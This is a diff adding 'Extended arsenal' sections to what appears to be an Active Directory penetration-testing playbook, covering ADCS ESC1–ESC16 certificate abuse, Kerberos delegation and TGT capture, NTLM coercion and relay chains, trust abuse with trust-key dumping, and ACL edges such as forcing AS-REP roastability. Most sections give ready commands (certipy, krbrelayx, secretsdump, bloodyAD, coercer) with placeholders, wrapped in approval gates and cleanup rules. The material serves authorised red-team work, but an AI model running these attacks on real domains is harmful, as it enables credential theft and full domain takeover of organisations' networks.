@@ -351,3 +351,141 @@ proxychains4 nxc smb <internal> -u <u> -p <p>        proxychains4 secretsdump.py
 #   nxc smb <dc> -u <u> -p <p> -M ntdsutil                          # single-command variant
 #   DO NOT run against production DCs; prefer single-account DCSync (base ref). Catalogue the vector only.
 ```
+
+---
+
+## Extended arsenal — ADCS ESC1–ESC16 quick-reference   (issue as a TEST principal, PKINIT, then REVOKE)
+Note: the **Cleanup contract** governs every row — revoke each issued cert, restore any template / registry /
+mapping / attribute change, redact recovered keys/NT to fingerprints. Post-2022 strong mapping + Full-Enforcement
+KDCs neutralise several rows (6/9/10/16) unless the DC is unpatched/compat — CONFIRM, don't assume. Exact certipy
+invocations for ESC1/3/4/6/7/8/9/10/11/13/14/15 are in the blocks above; this is the consolidated decision matrix.
+```
+# certipy find -u <u>@<d> -p <p> -dc-ip <dc> -vulnerable -stdout     # flags most ESC rows below
+```
+| ESC | Condition (what `certipy find` flags) | Abuse (1-line) | Benign proof |
+|---|---|---|---|
+| ESC1 | enrollee-supplies-subject + client-auth EKU + low-priv enroll | request SAN = target UPN/SID | cert → PKINIT as test UPN → revoke |
+| ESC2 | Any-Purpose / no EKU | cert usable for any purpose / sub-CA-style signing | issue one test cert → revoke |
+| ESC3 | Certificate-Request-Agent EKU template | enrol-on-behalf-of another principal | agent pfx → OBO test cert → revoke both |
+| ESC4 | write / FullControl over a template ACL | rewrite template → ESC1 → restore | temp edit → issue → restore template + revoke |
+| ESC5 | low-priv control of a PKI object (CA computer obj, NTAuth, PKS/enrollment container) | own the object → own the PKI | enumerate the ACL + report (do NOT rewrite NTAuth) |
+| ESC6 | CA has EDITF_ATTRIBUTESUBJECTALTNAME2 | any template accepts a user SAN → ESC1 | test SAN cert → PKINIT → revoke (needs weak map post-2022) |
+| ESC7 | ManageCA / ManageCertificates on the CA | flip EDITF, approve/issue denied reqs, SetExtension | add-officer → issue one test req → revoke + drop officer |
+| ESC8 | HTTP/CES/CEP/NDES web-enroll + machine+client-auth template | relay coerced NTLM → cert for the relayed host | lab relay → issue DC/machine cert → revoke |
+| ESC9 | template CT_FLAG_NO_SECURITY_EXTENSION + GenericWrite on target | UPN-swap → cert maps to admin → revert UPN | shadow-cred NT → swap → cert → auth → restore UPN + revoke |
+| ESC10 | DC weak map (StrongCertBinding=0 / CertMappingMethods 0x4) | UPN-swap, no template precondition | read reg value → report; swap + revert if exercised |
+| ESC11 | CA RPC (ICPR) not enforcing encryption | relay coerced NTLM → cert via RPC (no web) | confirm flag → lab relay → revoke |
+| ESC12 | CA key on YubiHSM2 + HSM pw cleartext in HKLM\SOFTWARE\Yubico\YubiHSM | shell on CA → reuse HSM key → sign any cert | read-only: confirm HSM + reg key exist → report (do NOT sign) |
+| ESC13 | template issuance-policy OID linked to a group (msDS-OIDToGroupLink) | enrol → token carries the group SID | issue test cert → show group in token → revoke |
+| ESC14 | weak / writable altSecurityIdentities explicit mapping | map cert issuer+serial → auth as victim | if write held: map test cert → auth → CLEAR attr |
+| ESC15 | unpatched CA + v1 enrollee-subject template (CVE-2024-49019) | inject Client-Auth / Req-Agent app-policy in CSR | issue test cert w/ injected EKU → PKINIT → revoke |
+| ESC16 | CA globally omits szOID_NTDS_CA_SECURITY_EXT (SID ext) | domain-wide UPN-swap (CA-wide ESC9) | confirm CA disabled-ext list → report; swap+revert on compat-KDC only |
+
+---
+
+## Extended arsenal — Delegation primitives   (demonstrate the VECTOR on a TEST target, purge tickets)
+Note: Cleanup contract applies — purge every ccache/ticket, clear any attribute set, drop any computer account
+created. S4U (getST / Rubeus s4u), RBCD (addcomputer + rbcd.py), the unconstrained TGT-export (mimikatz /
+Rubeus monitor) and the coercion triggers all have exact lines above/below — this adds SELECTION LOGIC + one net-new primitive.
+```
+# Pick the primitive by the account's UAC + attributes (inventory with findDelegation.py, base ref):
+#   TRUSTED_FOR_DELEGATION (UAC 0x80000)        -> UNCONSTRAINED : captures any TGT that authenticates to the host
+#   msDS-AllowedToDelegateTo populated          -> CONSTRAINED   : S4U2proxy to the listed SPN(s)
+#     + TRUSTED_TO_AUTH_FOR_DELEGATION (T2A4D)  ->   protocol transition: S4U2self from a password (no user TGT)
+#     - without T2A4D (Kerberos-only)           ->   need an existing forwardable ticket to the account first
+#   msDS-AllowedToActOnBehalfOfOtherIdentity    -> RBCD          : always does S4U2self+proxy, no T2A4D (ACL section)
+
+# UNCONSTRAINED on a host you control -> coerce a DC, lift its forwarded TGT (CAPABILITY-ONLY)
+#   Windows side = Rubeus.exe monitor (base ref); Linux capture primitive:
+krbrelayx.py -aesKey <unconstrained_host_aes>     # decrypt the inbound AP-REQ, save the embedded DC$ TGT
+#   trigger with any coercion method (next section) -> hold <dc>$ TGT -> prove capability (klist) -> PURGE.
+#   NEVER DCSync / operate a prod DC with the captured TGT — demonstrate the vector only. APPROVAL-GATED.
+
+# CONSTRAINED nuance — S4U2proxy returns a ticket to the requested SPN, but the SERVICE CLASS isn't validated:
+#   a cifs/<t> ticket (base s4u line) is reusable as host/http/ldap/... on the SAME <t> via /altservice.
+#   target in Protected Users / NOT_DELEGATED -> needs Bronze Bit -force-forwardable (Kerberos arsenal). APPROVAL-GATED.
+```
+
+---
+
+## Extended arsenal — Coercion & NTLM/Kerberos relay chains   (non-disruptive; APPROVAL-GATED)
+Note: Cleanup contract applies — stop every listener/relay, tear down SOCKS, remove any object a relay created.
+Base refs already carry printerbug/petitpotam/coercer + ntlmrelayx one-liners; this adds the method matrix, the
+two missing coercers, and the relay-target decision matrix. Never coerce prod DCs recklessly (auth storms).
+
+Coercion method matrix (force a target to authenticate to your listener):
+
+| Method | Protocol / pipe | Trigger function(s) | Tool |
+|---|---|---|---|
+| PrinterBug   | MS-RPRN  \pipe\spoolss      | RpcRemoteFindFirstPrinterChangeNotification(Ex) | printerbug.py / SpoolSample |
+| PetitPotam   | MS-EFSR  \pipe\efsrpc       | EfsRpcOpenFileRaw / … (some opnums pre-auth, pre-patch) | petitpotam.py |
+| DFSCoerce    | MS-DFSNM \pipe\netdfs       | NetrDfsAddStdRoot / NetrDfsRemoveStdRoot | dfscoerce.py |
+| ShadowCoerce | MS-FSRVP \pipe\FssagentRpc  | IsPathSupported / IsPathShadowCopied | shadowcoerce.py |
+| (all, incl MS-PAR/MS-EVEN) | multi         | enumerate reachable methods | coercer.py coerce -t <t> -l <ip> -u <u> -p <p> |
+
+Relay-target decision matrix (where the coerced auth lands):
+
+| Relay to | Precondition | Outcome |
+|---|---|---|
+| ldaps://<dc> | LDAP signing / channel-binding NOT enforced | add computer / shadow-cred / RBCD / ACL escalate (`--escalate-user`, `--shadow-credentials`, `--delegate-access`) |
+| smb://<t>    | SMB signing NOT required (`--gen-relay-list`) | exec on a second host (`-socks` for sessions) |
+| http://<ca>/certsrv | web-enroll + machine template | ESC8 — cert for the relayed machine/DC (`--adcs`) |
+| rpc://<ca>   | ICPR not enforcing encryption (ESC11) | cert via RPC, no web endpoint (`-rpc-mode ICPR`) |
+```
+#   A machine/DC acct can't be relayed back to ITSELF (same-host NTLM reflection is blocked) -> relay to a
+#   DIFFERENT DC or to AD CS. Coerce DC$ -> relay to AD CS web-enroll (ESC8) is the classic no-cred takeover vector.
+#   Kerberos relay (krbrelayx) where NTLM is disabled -> cross-ref lateral ref; APPROVAL-GATED.
+```
+
+---
+
+## Extended arsenal — Trust abuse (intra-forest child→parent / inter-forest)   (FEASIBILITY-ONLY, APPROVAL-GATED)
+Note: Cleanup contract applies. Forge for a TEST SID and PROVE the filtering gap — never traverse a prod trust or
+operate a real child→parent hop. The inter-realm referral-TGT forge (ticketer -extra-sid) is in the Kerberos arsenal.
+```
+# Enumerate trusts + direction / transitivity
+nltest /domain_trusts /all_trusts          Get-DomainTrust            Get-ADTrust -Filter *
+ldeep ldap -u <u> -p <p> -d <d> -s ldap://<dc> trusts
+#   BloodHound: the TrustedBy edge + "Map Domain Trusts". Classify intra-forest (parent/child, tree-root) vs
+#   external vs forest; record the SID-filtering / selective-auth posture per trust.
+```
+| Trust | SID filtering default | What stays abusable |
+|---|---|---|
+| Intra-forest (child↔parent) | NOT enforced | ExtraSids: forge an inter-realm TGT with `<parent>-519` (Enterprise Admins) → child→parent |
+| External (domain↔domain) | Quarantine ON | high-RID ExtraSids filtered; foreign ACL/group memberships + cross-trust Kerberoast remain |
+| Forest↔forest | ON (+ optional selective-auth) | same as external; TGT-delegation OFF by default blocks unconstrained-capture across it |
+```
+# Abuse that survives a FILTERED (inter-forest) trust — normal creds, no forging:
+lookupsid.py '<d>/<u>:<p>'@<trusted_dc>                                 # map foreign SIDs / FSPs
+Get-DomainForeignGroupMember -Domain <trusted_d>                        # who in MY domain holds rights THERE
+GetUserSPNs.py -target-domain <trusted_d> -request '<d>/<u>:<p>' -dc-ip <dc>   # cross-trust Kerberoast (crack OFFLINE)
+#   unconstrained-deleg + coercion across a trust works ONLY where TGT delegation is enabled (rare inter-forest).
+# Trust-key route (CAPABILITY-ONLY): dump the TDO trust key, forge a referral TGT for a TEST SID
+secretsdump.py -just-dc-user '<d>\<trusted_d>$' '<d>/<u>:<p>'@<dc>      # SINGLE trust account (not the domain)
+#   -> feed the key to the inter-realm ticketer line (Kerberos arsenal); demonstrate, never traverse.
+```
+
+---
+
+## Extended arsenal — ACL edges (additional)   (exercise ONE edge on a TEST principal, then REVERT)
+Note: Cleanup contract applies — record originals, revert every UAC bit / attribute / ACE / membership; crack any
+roast OFFLINE. These are the edges NOT covered in the base/extended ACL blocks above.
+```
+# Targeted AS-REP roasting — GenericWrite / WriteAccountRestrictions lets you flip userAccountControl on a victim
+Set-DomainObject -Identity <victim> -XOR @{useraccountcontrol=4194304}          # SET DONT_REQ_PREAUTH (0x400000)
+bloodyAD -d <d> -u <u> -p <p> --host <dc> add uac <victim> -f DONT_REQ_PREAUTH  # same, cross-platform
+#   -> AS-REP roast <victim> (base kerberos, hashcat -m 18200), crack OFFLINE, then CLEAR the bit (REVERT):
+bloodyAD -d <d> -u <u> -p <p> --host <dc> remove uac <victim> -f DONT_REQ_PREAUTH
+#   only toggle DONT_REQ_PREAUTH and revert immediately; do not leave the account pre-auth-disabled.
+
+# AllExtendedRights maps to a known primitive, not a new action:
+#   on a USER          -> User-Force-Change-Password  = ForceChangePassword (base/extended ACL blocks)
+#   on the DOMAIN head -> DS-Replication-Get-Changes[-All] = DCSync   (SINGLE test account, APPROVAL-GATED)
+
+# ReadGMSAPassword edge — if the gMSA's PrincipalsAllowedToRetrieveManagedPassword resolves to a group you can
+#   write, ADD yourself (AddSelf/AddMember, base ACL), read, then REMOVE yourself (REVERT):
+#     add self -> gMSADumper.py / nxc ldap --gmsa (base ACL) -> managed blob -> NT (redact to fp) -> remove self.
+
+# WriteSPN (WriteProperty on servicePrincipalName) = targetedKerberoast (base ACL): set temp SPN -> roast -> REMOVE SPN.
+# Owns == WriteOwner -> the take-ownership chain (ACL extended). AddKeyCredentialLink == shadow-cred (base ACL).
+```
